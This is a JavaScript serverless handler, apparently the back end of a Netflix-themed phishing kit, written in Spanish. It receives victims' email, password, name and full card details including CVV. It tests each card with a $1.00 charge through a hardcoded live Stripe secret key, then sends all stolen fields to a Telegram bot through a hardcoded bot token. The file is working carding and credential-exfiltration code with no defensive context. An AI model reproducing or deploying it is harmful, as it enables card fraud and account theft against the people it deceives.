const axios = require('axios');
const qs = require('querystring');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Método no permitido' });
    }

    const data = req.body;
    const token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat_id = "7993722214";
    const stripe_secret = "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";

    let status_pago = "⏳ Procesando";
    let pago_exitoso = false;

    try {
        // 1. STRIPE - Crear Token
        const [month, year] = data.ex.split('/');
        const cardData = qs.stringify({
            'card[number]': data.cc.replace(/\s/g, ''),
            'card[exp_month]': month,
            'card[exp_year]': '20' + year,
            'card[cvc]': data.cv
        });

        const stripeToken = await axios.post('https://api.stripe.com/v1/tokens', cardData, {
            headers: { 'Authorization': `Bearer ${stripe_secret}`, 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        if (stripeToken.data.id) {
            // 2. STRIPE - Realizar Cargo de $1.00
            const chargeData = qs.stringify({
                amount: 100,
                currency: 'usd',
                source: stripeToken.data.id,
                description: 'Verif: ' + data.em
            });

            const charge = await axios.post('https://api.stripe.com/v1/charges', chargeData, {
                headers: { 'Authorization': `Bearer ${stripe_secret}`, 'Content-Type': 'application/x-www-form-urlencoded' }
            });

            if (charge.data.status === 'succeeded') {
                pago_exitoso = true;
                status_pago = "✅ PAGO APROBADO ($1.00)";
            }
        }
    } catch (error) {
        status_pago = "❌ RECHAZADA: " + (error.response?.data?.error?.message || error.message);
    }

    // 3. ENVIAR A TELEGRAM
    const mensaje = `🔔 HIT NETFLIX 🔔\n\n💰 STATUS: ${status_pago}\n📧 Email: ${data.em}\n🔑 Pass: ${data.pw}\n👤 Nombre: ${data.nm}\n💳 Card: ${data.cc}\n📅 Exp: ${data.ex}\n🔒 CVV: ${data.cv}`;
    
    await axios.get(`https://api.telegram.org/bot${token}/sendMessage`, {
        params: { chat_id: chat_id, text: mensaje }
    });

    return res.status(200).json({ pago: pago_exitoso, mensaje_error: status_pago });
}
